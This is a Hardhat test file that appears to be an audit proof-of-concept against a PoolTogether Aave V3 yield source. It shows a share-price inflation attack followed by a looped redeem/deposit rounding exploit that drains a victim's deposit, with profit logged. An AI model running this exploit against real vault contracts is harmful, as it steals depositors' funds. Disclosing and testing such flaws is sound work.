import { Signer } from '@ethersproject/abstract-signer';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { MockContract } from 'ethereum-waffle';
import { network, ethers, waffle } from 'hardhat';

import {
  AaveV3YieldSourceHarness,
  AaveV3YieldSourceHarness__factory,
  ATokenSimulator,
  ERC20Mintable,
  PoolSimulator
} from '../types';

import IAToken from '../abis/IAToken.json';
import IRewardsController from '../abis/IRewardsController.json';
import IPool from '../abis/IPool.json';
import IPoolAddressesProvider from '../abis/IPoolAddressesProvider.json';
import IPoolAddressesProviderRegistry from '../abis/IPoolAddressesProviderRegistry.json';
import SafeERC20Wrapper from '../abis/SafeERC20Wrapper.json';

const { constants, getContractFactory, getSigners, utils } = ethers;
const { AddressZero, MaxUint256 } = constants;
const { parseEther: toWei, parseUnits } = utils;

const PRECISION = BigNumber.from(10).pow(18)

const DECIMALS = 6;
const REFERRAL_CODE = 188;

describe('AaveV3YieldSource', () => {
  let contractsOwner: Signer;
  let yieldSourceOwner: SignerWithAddress;
  let wallet2: SignerWithAddress;
  let attacker: SignerWithAddress;

  let rewardsController: MockContract;
  let pool: PoolSimulator;
  let poolAddressesProvider: MockContract;
  let poolAddressesProviderRegistry: MockContract;

  let aaveV3YieldSource: AaveV3YieldSourceHarness;

  let usdcToken: ERC20Mintable;
  let aToken: ATokenSimulator;

  let constructorTest = false;

  const deployAaveV3YieldSource = async (
    aTokenAddress: string,
    rewardsControllerAddress: string,
    poolAddressesProviderRegistryAddress: string,
    decimals: number,
    owner: string,
  ): Promise<AaveV3YieldSourceHarness> => {
    const AaveV3YieldSource = (await ethers.getContractFactory(
      'AaveV3YieldSourceHarness',
    )) as AaveV3YieldSourceHarness__factory;

    return await AaveV3YieldSource.deploy(
      aTokenAddress,
      rewardsControllerAddress,
      poolAddressesProviderRegistryAddress,
      'PoolTogether aUSDC Yield',
      'PTaUSDCY',
      decimals,
      owner,
    );
  };

  beforeEach(async () => {
    const { deployMockContract } = waffle;

    [contractsOwner, yieldSourceOwner, wallet2, attacker] = await getSigners();

    const ERC20MintableContract = await getContractFactory('ERC20Mintable', contractsOwner);

    usdcToken = (await ERC20MintableContract.deploy('USD Coin', 'USDC', 6)) as ERC20Mintable;

    const aTokenSimulator = await getContractFactory('aTokenSimulator', contractsOwner);

    //Deploy my own aToken
    aToken = (await aTokenSimulator.deploy('aToken', 'aToken', 18, usdcToken.address)) as ATokenSimulator;

    const PoolSimulator = await getContractFactory('PoolSimulator', contractsOwner);

    pool = (await PoolSimulator.deploy(usdcToken.address, aToken.address)) as PoolSimulator;

    //Start pool off with a bunch of tokens (I am cheating)
    await usdcToken.mint(pool.address, BigNumber.from(10).pow(60));
    await aToken.mint(pool.address, BigNumber.from(10).pow(60));

    rewardsController = await deployMockContract(contractsOwner, IRewardsController);

    poolAddressesProvider = await deployMockContract(contractsOwner, IPoolAddressesProvider);

    poolAddressesProviderRegistry = await deployMockContract(
      contractsOwner,
      IPoolAddressesProviderRegistry,
    );

    await poolAddressesProvider.mock.getPool.returns(pool.address);
    await poolAddressesProviderRegistry.mock.getAddressesProvidersList.returns([
      poolAddressesProvider.address,
    ]);

    aaveV3YieldSource = await deployAaveV3YieldSource(
      aToken.address,
      rewardsController.address,
      poolAddressesProviderRegistry.address,
      DECIMALS,
      yieldSourceOwner.address,
    );

    await aToken.forciblySetApproval(aaveV3YieldSource.address, pool.address, MaxUint256)
  });

  describe('PoolTogether vulnerabilities', () => {
    //For this test I assume USDC has 18 decimals rather than 6. I'm pretty sure it works either way; just making it easier on myself.
    it('allows easy pool draining if an early depositor ramps up the share price, then rug pulls', async () => {
      const USDC_DECIMALS = 18;
      //Mint 1 share to attacker for 1 wei
      const ATTACKER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      const ATTACK_INIT_DEPOSIT = BigNumber.from(10).pow(USDC_DECIMALS).mul(1000)
      await usdcToken.connect(attacker).approve(aaveV3YieldSource.address, MaxUint256)
      await usdcToken.mint(attacker.address, ATTACKER_STARTING_BAL)  //Attacker starts with 10,000 USDC (well, not usdc due to decimals, but most other coins)
      await aaveV3YieldSource.connect(attacker).supplyTokenTo(1, attacker.address);

      //Attacker transfers in 10,000 USDC to ramp share value up to 10^22 tokens / share
      await usdcToken.connect(attacker).approve(pool.address, MaxUint256)
      await pool.connect(attacker).supply(usdcToken.address, ATTACK_INIT_DEPOSIT, aaveV3YieldSource.address, 4)

      //Now some poor sap deposits 100,000 USDC
      const USER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      await usdcToken.mint(wallet2.address, USER_STARTING_BAL)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)
      await aaveV3YieldSource.connect(wallet2).supplyTokenTo(USER_STARTING_BAL, wallet2.address)


      //Now at this point I need to call withdraw over and over. If a share is worth 1000 tokens, I redeem 1999 tokens (burning 1 share), then deposit it back and repeat.

      let preExploitAttackerBalance = await usdcToken.balanceOf(attacker.address)
      let preExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)

      // The math could be improved here (it's a little inconsistent; some iterations don't make money), but works well enough as is to steal everything.
      for (let i = 0; i < 200; i++)   {
        //Burn almost 2 shares' worth
        let currentShareValue = await aaveV3YieldSource.sharesToToken(1)
        let amountToBurn = currentShareValue.mul(2).sub(1)

        await aaveV3YieldSource.connect(attacker).redeemToken(amountToBurn)

        let tokensToDeposit = await aaveV3YieldSource.sharesToToken(2)
        //Deposit 2 shares' worth
        await aaveV3YieldSource.connect(attacker).supplyTokenTo(tokensToDeposit.mul(10).div(9), attacker.address)
      }

      //At the end, the attacker should have very slightly less usdc token, but more shares. Let's have them withdraw everything to make the exploit more clear.
      let postExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)
      let tokensPerShare = await aaveV3YieldSource.sharesToToken(1)
      await aaveV3YieldSource.connect(attacker).redeemToken(postExploitAttackerShares.mul(tokensPerShare.add(1)).sub(1))

      //Results
      let profit = (await usdcToken.balanceOf(attacker.address)).sub(ATTACKER_STARTING_BAL)
      console.log('Total profit once everything is sold: ', profit.toString())
      console.log('Initial investment: $', ATTACK_INIT_DEPOSIT.div(PRECISION).toString())
      console.log('Profit: $', profit.div(PRECISION).toString())
      console.log('Profit / iteration: $', profit.div(200).div(PRECISION).toString())
      console.log('Exploit ROI (profit / amount initially deposited): ', profit.div(ATTACK_INIT_DEPOSIT).mul(100).toString(), `%`)
    })
  })
})